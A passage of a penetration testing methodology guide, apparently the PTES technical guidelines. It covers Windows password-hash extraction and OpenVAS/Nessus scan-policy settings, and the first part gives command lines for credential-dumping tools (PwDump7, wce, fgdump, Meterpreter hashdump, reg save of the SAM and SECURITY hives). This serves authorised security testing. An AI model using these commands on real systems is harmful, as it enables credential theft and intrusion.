<h4>Support Tools Binaries / Links / Usage<a class="headerlink" href="#support-tools-binaries-links-usage" title="Permalink to this headline">¶</a></h4>
<p>REMEMBER: DO NOT RUN BINARIES YOU HAVEN’T VETTED</p>
<table border="1" class="docutils">
<colgroup>
<col width="41%" />
<col width="59%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">align=left&#8221;|Description</th>
<th class="head">Link to download</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><code class="docutils literal"><span class="pre">carrot.exe</span> <span class="pre">/im</span> <span class="pre">/ie</span> <span class="pre">/ff</span> <span class="pre">/gc</span> <span class="pre">/wlan</span> <span class="pre">/vnc</span> <span class="pre">/ps</span> <span class="pre">/np</span> <span class="pre">/mp</span> <span class="pre">/dialup</span> <span class="pre">/pwdump</span></code></td>
<td><a class="reference external" href="http://h.ackack.net/carrot-exe.html">http://h.ackack.net/carrot-exe.html</a></td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">PwDump7.exe</span> <span class="pre">&gt;</span> <span class="pre">ntlm.txt</span></code></td>
<td><a class="reference external" href="http://www.tarasco.org/security/pwdump_7/">http://www.tarasco.org/security/pwdump_7/</a> Invasively Dumps Windows NTLM hashes. Holds the credentials for all accounts.</td>
</tr>
<tr class="row-even"><td>Nircommands</td>
<td><a class="reference external" href="http://www.nirsoft.net/utils/nircmd.html">http://www.nirsoft.net/utils/nircmd.html</a> A collection of small nifty features.</td>
</tr>
<tr class="row-odd"><td><code class="docutils literal"><span class="pre">wce.exe</span></code></td>
<td><p class="first"><a class="reference external" href="http://www.ampliasecurity.com/research/wce_v1_2.tgz">http://www.ampliasecurity.com/research/wce_v1_2.tgz</a></p>
<p class="last"><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;Pull&nbsp;NTLM&nbsp;hashes&nbsp;from&nbsp;login&nbsp;sessions&nbsp;out&nbsp;of&nbsp;memory,&nbsp;steal&nbsp;ks&nbsp;tickets&nbsp;from&nbsp;activerberoe&nbsp;processes&nbsp;and&nbsp;apply&nbsp;them&nbsp;to&nbsp;others.</span></code></p>
</td>
</tr>
<tr class="row-even"><td><code class="docutils literal"><span class="pre">adfind.exe</span> <span class="pre">-b</span> <span class="pre">ou=ActiveDirectory,dc=example,dc=com</span> <span class="pre">-f</span> <span class="pre">&quot;objectClass=user&quot;</span> <span class="pre">sn</span> <span class="pre">givenName</span>&#160; <span class="pre">samaccountname</span> <span class="pre">-nodn</span> <span class="pre">-adcsv</span> <span class="pre">&gt;</span> <span class="pre">exported_users.csv</span></code></td>
<td><a class="reference external" href="http://www.joeware.net/freetools/">http://www.joeware.net/freetools/</a> Joeware tools have been used by admins for a while. This command will output the firstname, lastname and username of everyone in the AD domain example.com. Edit as needed.</td>
</tr>
</tbody>
</table>
<div class="section" id="various-tools">
<h5>Various tools<a class="headerlink" href="#various-tools" title="Permalink to this headline">¶</a></h5>
<p>(e.g. \\hackarmoury.com\tools\all_binaries\fgdump.exe)</p>
<p><code class="docutils literal"><span class="pre">&nbsp;&nbsp;&nbsp;Some&nbsp;examples&nbsp;of&nbsp;protocols&nbsp;in&nbsp;use:</span></code></p>
<p><a class="reference external" href="http://hackarmoury.com/tools">http://hackarmoury.com/tools</a></p>
<p>\\hackarmoury.com\tools</p>
<p><a class="reference external" href="ftp://hackarmoury.com">ftp://hackarmoury.com</a></p>
<p>svn://hackarmoury.com</p>
</div>
</div>
</div>
<div class="section" id="obtaining-password-hashes-in-windows">
<h3>Obtaining Password Hashes in Windows<a class="headerlink" href="#obtaining-password-hashes-in-windows" title="Permalink to this headline">¶</a></h3>
<p>There are two general methods for obtaining the password hashes in
Windows. One method is to inject code into the LSASS (Local Security
Authority Subsystem Service) process and the other is to extract the
hashes from the SAM, system, and security registry hives. Pwdump6,
Fgdump, and the hashdump command in Meterpreter use the LSASS injection
method and Creddump extracts passwords from the SAM, system, and
security hives. Once the hashes have been extracted, you can crack the
hashes to obtain the passwords or you can use the hashes in a pass the
hash exploit.</p>
<div class="section" id="lsass-injection">
<h4>LSASS Injection<a class="headerlink" href="#lsass-injection" title="Permalink to this headline">¶</a></h4>
<p>One of the pitfalls of using the LSASS injection method is the
possibility of crashing the LSASS process, which will reboot the
machine. Another pitfall is tools like Pwdump and Fgdump are often
stopped by AV tools.</p>
<div class="section" id="pwdump6-and-fgdump">
<h5>Pwdump6 and Fgdump<a class="headerlink" href="#pwdump6-and-fgdump" title="Permalink to this headline">¶</a></h5>
<p>Pwdump6 and Fgdump are available at <a class="reference external" href="http://www.foofus.net/~fizzgig">http://www.foofus.net/~fizzgig</a>.
Fgdump implements a number of features that Pwdump6 does not and is the
preferred tool to use. Also, the user account must be an administrator
on the target machine.</p>
<ul class="simple">
<li>To dump passwords on the local host with the credential of the
current user use: <code class="docutils literal"><span class="pre">fgdump</span></code></li>
<li>To dump passwords on the local host with other credentials use:
<code class="docutils literal"><span class="pre">fgdump</span> <span class="pre">-h</span> <span class="pre">127.0.0.1</span> <span class="pre">-u</span> <span class="pre">adminuser</span></code></li>
<li>To dump passwords on a remote host with specified credentials use:
<code class="docutils literal"><span class="pre">fgdump</span> <span class="pre">-h</span> <span class="pre">192.168.0.1</span> <span class="pre">-u</span> <span class="pre">adminuser</span> <span class="pre">-p</span> <span class="pre">password</span></code></li>
</ul>
</div>
<div class="section" id="hashdump-in-meterpreter">
<h5>Hashdump in Meterpreter<a class="headerlink" href="#hashdump-in-meterpreter" title="Permalink to this headline">¶</a></h5>
<p>From the meterpreter prompt run <code class="docutils literal"><span class="pre">hashdump</span></code>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">hashdump</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="o">******</span><span class="n">NOPASSWORD</span><span class="o">*******</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">HelpAssistant</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="o">******</span><span class="n">NOPASSWORD</span><span class="o">*******</span><span class="p">:</span><span class="n">ee96955033d6fa723cc2fccb7bec093d</span><span class="p">:::</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="extracting-passwords-from-registry">
<h4>Extracting Passwords from Registry<a class="headerlink" href="#extracting-passwords-from-registry" title="Permalink to this headline">¶</a></h4>
<p>You will need to copy the SAM, system, and security files from the
target machine to your machine. The files are located in
C:\WINDOWS\system32\config and are typically inaccessible while the
machine is running. Fortunately, you can get a copy of the files from
the registry in HKEY_LOCAL_MACHINE and some times you can find them in
c:\WINDOWS\repair.</p>
<div class="section" id="copy-from-the-registry">
<h5>Copy from the Registry<a class="headerlink" href="#copy-from-the-registry" title="Permalink to this headline">¶</a></h5>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SAM</span> <span class="n">c</span><span class="p">:</span>\<span class="n">sam</span><span class="o">.</span><span class="n">reg</span>
<span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SYSTEM</span> <span class="n">c</span><span class="p">:</span>\<span class="n">system</span><span class="o">.</span><span class="n">reg</span>
<span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SECURITY</span> <span class="n">c</span><span class="p">:</span>\<span class="n">security</span><span class="o">.</span><span class="n">reg</span>
</pre></div>
</div>
<p>If you get an &#8220;Access Denied&#8221; error message when trying to save the
SECURITY hive then try:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">00</span> <span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SECURITY</span> <span class="n">c</span><span class="p">:</span>\<span class="n">security</span><span class="o">.</span><span class="n">reg</span>
</pre></div>
</div>
<p>You are using the at command to schedule the reg command so set the time
appropriately.</p>
</div>
<div class="section" id="extracting-the-hashes">
<h5>Extracting the Hashes<a class="headerlink" href="#extracting-the-hashes" title="Permalink to this headline">¶</a></h5>
<p>Creddump includes three python scripts designed to extract the local
password hashes (pwdump.py), the cached credentials (cachedump.py), and
the LSA secrets (lsadump.py). To get the local password hashes use:
<code class="docutils literal"><span class="pre">pwdump.py</span> <span class="pre">system.reg</span> <span class="pre">sam.reg</span></code>. To get the cached credentials use:
<code class="docutils literal"><span class="pre">cachedump.py</span> <span class="pre">system.reg</span> <span class="pre">security.reg</span></code>.</p>
</div>
</div>
<div class="section" id="extracting-passwords-from-registry-using-meterpreter">
<h4>Extracting Passwords from Registry using Meterpreter<a class="headerlink" href="#extracting-passwords-from-registry-using-meterpreter" title="Permalink to this headline">¶</a></h4>
<p>In Meterpreter use the command <code class="docutils literal"><span class="pre">run</span> <span class="pre">post/windows/gather/hashdump</span></code> to
get the local hashes from the SAM database. To get the cached hashes you
will need to download the cachedump.rb module from
<a class="reference external" href="http://lab.mediaservice.net/code/cachedump.rb">http://lab.mediaservice.net/code/cachedump.rb</a> and put it into
/modules/post/windows/gather. Then you can run the command
<code class="docutils literal"><span class="pre">run</span> <span class="pre">post/windows/gather/cachedump</span></code>.</p>
</div>
</div>
</div>
<div class="section" id="reporting">
<h2>Reporting<a class="headerlink" href="#reporting" title="Permalink to this headline">¶</a></h2>
<p>&lt;Contribution Needed&gt;</p>
<div class="section" id="executive-level-reporting">
<h3>Executive-Level Reporting<a class="headerlink" href="#executive-level-reporting" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ol class="arabic simple">
<li>Business Impact</li>
<li>Customization</li>
<li>Talking to the business</li>
<li>Affect bottom line</li>
<li>Strategic Roadmap</li>
<li>Maturity model</li>
<li>Appendix with terms for risk rating</li>
</ol>
</div>
<div class="section" id="technical-reporting">
<h3>Technical Reporting<a class="headerlink" href="#technical-reporting" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ol class="arabic simple">
<li>Identify systemic issues and technical root cause analysis</li>
<li>Maturity Model</li>
<li>Technical Findings</li>
</ol>
<ul class="simple">
<li>Description</li>
<li>Screen shots</li>
<li>Ensure all PII is correctly redacted</li>
<li>Request/Response captures</li>
<li>PoC examples</li>
<li>Ensure PoC code provides benign validation of the flaw</li>
</ul>
<ol class="arabic simple" start="4">
<li>Reproducible Results</li>
</ol>
<ul class="simple">
<li>Test Cases</li>
<li>Fault triggers</li>
</ul>
<ol class="arabic simple" start="5">
<li>Incident response and monitoring capabilities</li>
</ol>
<ul class="simple">
<li>Intelligence gathering</li>
<li>Reverse IDS</li>
<li>Pentest Metrics</li>
<li>Vuln. Analysis</li>
<li>Exploitation</li>
<li>Post-exploitation</li>
<li>Residual effects (notifications to
3rd parties, internally, LE, etc...)</li>
</ul>
<ol class="arabic simple" start="6">
<li>Common elements</li>
</ol>
<ul class="simple">
<li>Methodology</li>
<li>Objective(s)</li>
<li>Scope</li>
<li>Summary of findings</li>
<li>Appendix with terms for risk rating</li>
</ul>
</div>
<div class="section" id="quantifying-the-risk">
<h3>Quantifying the risk<a class="headerlink" href="#quantifying-the-risk" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ol class="arabic simple">
<li>Evaluate incident frequency</li>
</ol>
<ul class="simple">
<li>probable event frequency</li>
<li>estimate threat capability
(from 3 - threat modeling)</li>
<li>Estimate controls strength (6)</li>
<li>Compound vulnerability (5)</li>
<li>Level of skill required</li>
<li>Level of access required</li>
</ul>
<ol class="arabic simple" start="2">
<li>Estimate loss magnitude per incident</li>
</ol>
<ul class="simple">
<li>Primary loss</li>
<li>Secondary loss</li>
<li>Identify risk root cause analysis</li>
<li>Root Cause is never a patch</li>
<li>Identify Failed Processes</li>
</ul>
<ol class="arabic simple" start="3">
<li>Derive Risk</li>
</ol>
<ul class="simple">
<li>Threat</li>
<li>Vulnerability</li>
<li>Overlap</li>
</ul>
</div>
<div class="section" id="deliverable">
<h3>Deliverable<a class="headerlink" href="#deliverable" title="Permalink to this headline">¶</a></h3>
<p>&lt;Contribution Needed&gt;</p>
<ol class="arabic simple">
<li>Preliminary results</li>
<li>Review of the report with the customer</li>
<li>Adjustments to the report</li>
<li>Final report</li>
<li>Versioning of Draft and Final Reports</li>
<li>Presentation</li>
</ol>
<ul class="simple">
<li>Technical</li>
<li>Management Level</li>
</ul>
<ol class="arabic simple" start="7">
<li>Workshop / Training</li>
</ol>
<ul class="simple">
<li>Gap Analysis (skills/training)</li>
</ul>
<div class="line-block">
<div class="line">8. Exfiltarted evidence and any other raw (non-proprietary) data</div>
<div class="line">gathered.</div>
</div>
<ol class="arabic simple" start="9">
<li>Remediation Roadmap</li>
</ol>
<ul class="simple">
<li>Triage</li>
<li>Maturity Model</li>
<li>Progression Roadmap</li>
<li>Long-term Solutions</li>
<li>Defining constraints</li>
</ul>
</div>
</div>
<div class="section" id="custom-tools-developed">
<h2>Custom tools developed<a class="headerlink" href="#custom-tools-developed" title="Permalink to this headline">¶</a></h2>
<p>In order to ensure that all tests are conducted with the same criteria,
you will need to ensure that you have the correct OpenVAS Global
Settings. In order to do this you will need to connect to the OpenVAS
Server and modifiy the Global Settings. There are seven configuration
tabs: General, Credentials, Target Selection, Access Rules, Prefs., and
KB. For our purposes, most of the default settings do not need to be
modified.</p>
</div>
<div class="section" id="general">
<h2>General<a class="headerlink" href="#general" title="Permalink to this headline">¶</a></h2>
<p>The General tab is where we will set certain scan options. The actual
settings have been defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="71%" />
<col width="29%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>General Scan Options Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Port Range</td>
<td>1-65535</td>
</tr>
<tr class="row-odd"><td>Consider unscanned ports as closed</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Checks to perform concurrently</td>
<td>4</td>
</tr>
<tr class="row-odd"><td>Path to CGIs</td>
<td>/cgi-bin:/scripts</td>
</tr>
<tr class="row-even"><td>Do a reverse lookup of the IP before testing it</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Safe checks</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Designate hosts by their MAC address</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port Scanner Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>ike-scan (NASL wrapper)</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Snmpwalk &#8216;scanner&#8217;</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>SYN Scan</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Exclude toplevel domain wildcard hosts</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>portbunny (NASL wrapper)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>strobe (NASL wrapper)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Scan for LaBrea tarpitted hosts</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>amap (NASL wrapper)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>pnscan (NASL wrapper)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Netstat &#8216;scanner&#8217;</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Simple TCP portscan in NASL</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>OpenVAS TCP scanner</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Ping Host</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Nmap (NASL wrapper)</td>
<td>Checked</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="plugins">
<h2>Plugins<a class="headerlink" href="#plugins" title="Permalink to this headline">¶</a></h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin
family or individual checks that we want to enable. The easiest way to
set this is to select the &#8220;Enable All&#8221; button from the main Plugins tab,
however this assumes the Safe Checks is selected from the General Tab.</p>
</div>
<div class="section" id="credentials">
<h2>Credentials<a class="headerlink" href="#credentials" title="Permalink to this headline">¶</a></h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use
authentication credentials during scanning. For our policy we will not
edit any of the settings within this section. They are however
documented to ensure completeness.</p>
<table border="1" class="docutils">
<colgroup>
<col width="68%" />
<col width="32%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>SMB Authorization</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>SMB login</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SMB domain (optional)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;SSH Authorization &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Per-host SSH key Selection (localhost)</td>
<td>Select SSH Login</td>
</tr>
<tr class="row-even"><td>Per-host SSH key Selection (Default)</td>
<td>Select SSH Login</td>
</tr>
<tr class="row-odd"><td>User per-target login information</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>SSH login name</td>
<td>sshovas</td>
</tr>
<tr class="row-odd"><td>SSH password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSH public key</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH private key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSH key passphrase</td>
<td>Blank</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="target-selection">
<h2>Target Selection<a class="headerlink" href="#target-selection" title="Permalink to this headline">¶</a></h2>
<p>The Target Selection tab, allows us to specify specific targets or to
read them from a file. The main then to ensure that is checked is the
Perform a DNS zone transfer.</p>
</div>
<div class="section" id="access-rules">
<h2>Access Rules<a class="headerlink" href="#access-rules" title="Permalink to this headline">¶</a></h2>
<p>The Access Selection tab, allows us to view and manage the access rules
for our scanner. These rules determine which host you may scan. Note
that there are three kinds of access rules:</p>
<p>Server rules, Serverside user rules, and Clientside user rules. Server
rules are global to the server and will affect all users that connect to
this server. Serverside user rules are specific to a user and affect
only this user, no matter from which client he connects to this server.
Finally, Clientside user rules are specific to the client. They will
affect only the scope in which they are defined.</p>
</div>
<div class="section" id="preferences">
<h2>Preferences<a class="headerlink" href="#preferences" title="Permalink to this headline">¶</a></h2>
<p>The Preferences tab allows for more granular control over scan settings.
All items in this category should be left alone.</p>
</div>
<div class="section" id="knowledge-base">
<h2>Knowledge Base<a class="headerlink" href="#knowledge-base" title="Permalink to this headline">¶</a></h2>
<p>The configuration section for the Knowledge Base (KB) allows you to
control the management of the server-side scan results. Information
retrieved by plugins is collected in a KB during a scan. This is done on
a per-host basis, meaning there is one KB for every host scanned. The
default is to discard the KB once all plugins have finished, but under
certain circumstances it can be quite useful to tell the server to keep
the KBs generated during the scan and use them again at a later time.</p>
<p>In order to ensure that all tests are conducted with the same criteria,
you will need to ensure that you have created a policy called &#8220;Only Safe
Checks.&#8221; In order to do this you will need to connect to the Nessus
server UI, so that you can create a custom policy by clicking on the
&#8220;Policies&#8221; option on the bar at the top and then &#8220;+ Add&#8221; button on the
right. The &#8220;Add Policy&#8221; screen will be displayed as follows:</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_162.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>There are four configuration tabs: General, Credentials, Plugins, and
Preferences. For our purposes, most of the default settings do not need
to be modified.</p>
</div>
<div class="section" id="id85">
<h2>General<a class="headerlink" href="#id85" title="Permalink to this headline">¶</a></h2>
<p>The General tab is where we will name and configure scan options related
to our policy. There are six boxes of grouped options that control
scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port
Scan Options, and Performance.</p>
<p>Basic allows us to define the policy itself. The actual settings have
been defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="48%" />
<col width="52%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Basic Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Name</td>
<td>Only Safe Checks</td>
</tr>
<tr class="row-odd"><td>Visibility</td>
<td>Shared</td>
</tr>
<tr class="row-even"><td>Description</td>
<td>Complete scans not including Denial of Service.</td>
</tr>
<tr class="row-odd"><td><strong>Scan Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Save Knowledge Base</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Safe Checks</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Silent Dependencies</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Log Scan Details to Server</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Stop Host Scan on Disconnect</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Avoid Sequential Scans</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Consider Unscanned Ports as Closed</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Designate Hosts by their DNS Name</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Network Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Reduce Parallel Connections on Congestion</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Use Kernel Congestion Detection (Linux Only)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Port Scanners Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>TCP Scan</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>UDP Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>SYN Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>SNMP Scan</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Netstat SSH Scan</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Netstat WMI Scan</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Ping Host</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port Scan Options Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Port Scan Range</td>
<td>1-65535</td>
</tr>
<tr class="row-even"><td><strong>Performance Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Max Checks Per Host (Windows)</td>
<td>5</td>
</tr>
<tr class="row-even"><td>Max Checks Per Host (Linux)</td>
<td>50-75</td>
</tr>
<tr class="row-odd"><td>Max Hosts Per Scan</td>
<td>5</td>
</tr>
<tr class="row-even"><td>Network Receive Timeout (seconds)</td>
<td>5</td>
</tr>
<tr class="row-odd"><td>Max Simultaneous TCP Sessions Per Host</td>
<td>Unlimited</td>
</tr>
<tr class="row-even"><td>Max Simultaneous TCP Sessions Per Scan</td>
<td>Unlimited</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id86">
<h2>Credentials<a class="headerlink" href="#id86" title="Permalink to this headline">¶</a></h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use
authentication credentials during scanning. For our policy we will not
edit any of the settings within this section. They are however
documented to ensure completeness.</p>
<table border="1" class="docutils">
<colgroup>
<col width="71%" />
<col width="29%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Windows credentials</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>SMB account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SMB domain (optional)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password type</td>
<td>Password</td>
</tr>
<tr class="row-even"><td>Additional SMB account (1)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB password (1)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB domain (optional)(1)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB account (2)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB password (2)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB domain (optional)(2)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB account (3)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB password (3)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB domain (optional)(3)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Never send SMB credentials in clear text</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Only use NTLMv2</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;SSH Settings &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>SSH user name</td>
<td>root</td>
</tr>
<tr class="row-even"><td>SSH password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH public key to use</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSH private key to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Passphrase for SSH key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Elevate privileges with</td>
<td>Nothing</td>
</tr>
<tr class="row-odd"><td>su login</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Escalation password</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH known hosts file</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Preferred SSH port</td>
<td>22</td>
</tr>
<tr class="row-odd"><td>Client version</td>
<td>OpenSSH_5.0</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Kerberos configuration</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Kerberos Key Distribution Center (KDC)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Kerberos KDC Port</td>
<td>88</td>
</tr>
<tr class="row-even"><td>Kerberos KDC Transport</td>
<td>UDP</td>
</tr>
<tr class="row-odd"><td>Kerberos Realm (SSH only)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Cleartext protocols settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>User name</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Try to perform patch level checks over telnet</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Try to perform patch level checks over rsh</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Try to perform patch level checks over rexec</td>
<td>Unchecked</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id87">
<h2>Plugins<a class="headerlink" href="#id87" title="Permalink to this headline">¶</a></h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin
family or individual checks that we want to enable. The easiest way to
set this is to select the &#8220;Enable All&#8221; button from the main Plugins tab,
however this assumes the Safe Checks is selected from the General Tab.</p>
</div>
<div class="section" id="id88">
<h2>Preferences<a class="headerlink" href="#id88" title="Permalink to this headline">¶</a></h2>
<p>The Preferences tab allows for more granular control over scan settings.
All items in this category should be. The actual settings have been
defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Cisco IOS Compliance Checks</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;Database Compliance Checks &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>&#8216;&#8217;&#8216;Database Settings &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Login</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>DB Type</td>
<td>Oracle</td>
</tr>
<tr class="row-odd"><td>Database SID</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Database port to use</td>
<td>Blank</td>
</tr>
